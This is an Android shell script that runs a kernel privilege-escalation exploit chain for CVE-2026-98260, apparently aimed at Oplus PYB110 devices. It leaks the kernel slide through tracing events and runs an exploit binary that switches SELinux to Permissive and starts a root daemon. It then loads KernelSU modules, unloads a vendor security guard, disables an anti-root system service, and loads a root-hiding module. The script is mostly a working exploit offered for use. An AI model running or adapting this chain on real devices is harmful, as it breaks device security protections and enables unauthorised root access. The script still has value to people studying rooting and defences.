#!/system/bin/sh
# PYB110 one-key flow, CVE-2026-98260 branch (t98260_plant + t98260_su).
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1
chmod 755 t98260_plant t98260_su prep_solve prep_patch forker ksu* ksud* 2>/dev/null

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
UNLOAD_GUARD=${PYB110_UNLOAD_GUARD:-0}
case "$MANAGER" in
  next) BASE=ksu-base-next.ko; KSUD=ksud_next; MPKG=com.rifsxd.ksunext ;;
  bakasu) BASE=ksu-base-bakasu.ko; KSUD=ksud_bakasu; MPKG=com.resukisu.resukisu ;;
  sukisu) BASE=ksu-base-sukisu.ko; KSUD=ksud_sukisu; MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; BASE=ksu-base.ko; KSUD=ksud_official; MPKG=me.weishu.kernelsu ;;
esac
MPKG=${PYB110_MANAGER_PKG:-$MPKG}
echo "EXPLOIT=98260 ENGINE=t98260 MANAGER=$MANAGER"

unload_guard() {
  if [ "$UNLOAD_GUARD" = "1" ]; then
    echo "UNLOAD_GUARD: rmmod oplus_secure_guard_new"
    su -c "rmmod oplus_secure_guard_new" 2>&1
    echo "UNLOAD_GUARD_RC=$?"
    if grep -qi oplus_secure_guard /proc/modules 2>/dev/null; then
      echo "UNLOAD_GUARD_STILL_LOADED"
    else
      echo "UNLOAD_GUARD_GONE"
    fi
  else
    echo "UNLOAD_GUARD_SKIP"
  fi
}

install_manager_apk() {
  APK=${PYB110_MANAGER_APK:-}
  if [ -n "$APK" ] && [ -f "$D/$APK" ]; then
    su -c "pm install -r '$D/$APK'" 2>&1
    echo "APK_INSTALL_RC=$?"
  fi
}

load_susfs() {
  if [ "${PYB110_SUSFS:-0}" != "1" ]; then
    echo "SUSFS_SKIP"
    return 0
  fi
  if [ ! -f "$D/susfs_guard_lkm.ko" ]; then
    echo "SUSFS_MISSING"
    return 0
  fi
  if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then
    echo "SUSFS_ALREADY"
    return 0
  fi
  loaded=0
  for c in "$D/$KSUD" /data/adb/ksud /data/adb/ksu/bin/ksud; do
    if ! su -c "test -x '$c'" 2>/dev/null; then continue; fi
    echo "SUSFS_INSMOD_TRY=$c"
    su -c "$c insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; break; fi
  done
  if [ "$loaded" != "1" ]; then
    echo "SUSFS_INSMOD_FALLBACK=insmod"
    su -c "insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; fi
  fi
  if [ "$loaded" = "1" ]; then
    echo "SUSFS_LOADED"
  else
    echo "SUSFS_LOAD_FAIL"
  fi
}

finish_manager() {
  cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
  unload_guard
  su -c "/data/local/tmp/ksud_official install" 2>&1
  echo "KSUD_INSTALL_RC=$?"
  install_manager_apk
  if [ "$DISABLE_ANTIROOT" = "1" ]; then
    su -c "pm disable-user --user 0 com.oplus.exsystemservice" 2>&1
    echo "DISABLE_RC=$?"
    su -c "pkill -9 -f com.oplus.exsystemservice" 2>&1
    echo "KILL_RC=$?"
    sleep 5
    su -c "pm enable com.oplus.exsystemservice" 2>&1
    echo "ANTIROOT_RESTORED: 已恢复 exsystemservice；如截图等系统功能异常，请软重启（重启 zygote/SystemUI）"
  else
    echo "ANTIROOT_SKIP: 开关关闭，未禁用安全组件"
  fi
  su -c "id; getenforce; grep -i kernelsu /proc/modules" 2>&1
  echo "SU_ID_RC=$?"
  if [ "$(su -c 'id -u' 2>/dev/null | tr -d '\r')" = "0" ]; then
    su -c "pkill -9 t98260_plant 2>/dev/null; rm -f /data/local/tmp/t98260-root.sock" 2>&1
    echo "ROOTD_CLEANED"
  else
    echo "ROOTD_KEPT: su 不可用，保留 rootd 兜底"
  fi
  load_susfs
  am force-stop "$MPKG" 2>/dev/null
  monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
}

if grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
  finish_manager
  echo DONE
  exit 0
fi

echo "[1/5] probe"
./t98260_plant --probe > probe.log 2>&1
rc=$?
cat probe.log
if [ $rc -ne 0 ]; then
  echo "PROBE_FAIL rc=$rc"
  exit 11
fi

echo "[2/5] capture + solve slide"
R=/sys/kernel/tracing/events/kmem/rss_stat
echo 1 > "$R/enable" 2>/dev/null
printf 'disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
printf 'disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
printf 'disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
SLIDE=""
for t in 1 2 3; do
  echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
  : > /sys/kernel/tracing/trace 2>/dev/null
  sh take_slide.sh
  if ./prep_solve . syms.txt; then
    SLIDE=$(cat slide.txt)
    break
  fi
  echo "SLIDE_RETRY=$t"
done
printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
if [ -z "$SLIDE" ]; then
  echo "SOLVE_FAIL"
  exit 12
fi
echo "SLIDE=$SLIDE"

echo "[3/5] run t98260_plant"
kill -9 $(pidof t98260_plant) 2>/dev/null
rm -f plant.log t98260-root.sock
R=/sys/kernel/tracing/events/kmem/rss_stat
echo 1 > "$R/enable" 2>/dev/null
printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
setsid ./t98260_plant --slide "$SLIDE" --budget 240 > plant.log 2>&1 &
BP=$!
echo "PLANT_PID=$BP (命中后 SELinux 变 Permissive，约 10-120 秒)"
ROOTED=0
i=0
while [ $i -lt 110 ]; do
  if grep -q "ROOTD_READY" plant.log 2>/dev/null; then ROOTED=1; break; fi
  if grep -qE "FAIL=(task|selinux|cred|init|probe)" plant.log 2>/dev/null; then break; fi
  if grep -q "PARKED=1" plant.log 2>/dev/null; then break; fi
  kill -0 $BP 2>/dev/null || break
  if [ $((i % 5)) -eq 0 ]; then
    tail -n 2 plant.log 2>/dev/null | sed 's/^/  | /'
  fi
  sleep 3
  i=$((i+1))
done
if [ "$ROOTED" != "1" ] || [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
  echo "PLANT_FAIL (enforce=$(getenforce 2>/dev/null))"
  tail -n 15 plant.log 2>/dev/null
  exit 13
fi
echo "PLANT_OK: enforce=Permissive, rootd ready"

echo "[4/5] handoff to $MANAGER"
./t98260_su -c "$D/$KSUD late-load --kmi android17-6.18 --allow-shell --package-name $MPKG" 2>&1
sleep 2
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "LATE_LOAD_RETRY: without --kmi"
  ./t98260_su -c "$D/$KSUD late-load --allow-shell --package-name $MPKG" 2>&1
  sleep 2
fi
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
  ./prep_patch "$BASE" syms.txt "$SLIDE" ksu-98260.ko || { echo "PATCH_FAIL"; exit 14; }
  ./t98260_su -c "insmod $D/ksu-98260.ko" 2>&1
  echo "INSMOD_RC=$?"
  sleep 2
fi
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "LOAD_FAIL"
  exit 15
fi
echo "MODULE_LOADED"

echo "[5/5] manager setup"
finish_manager
echo DONE
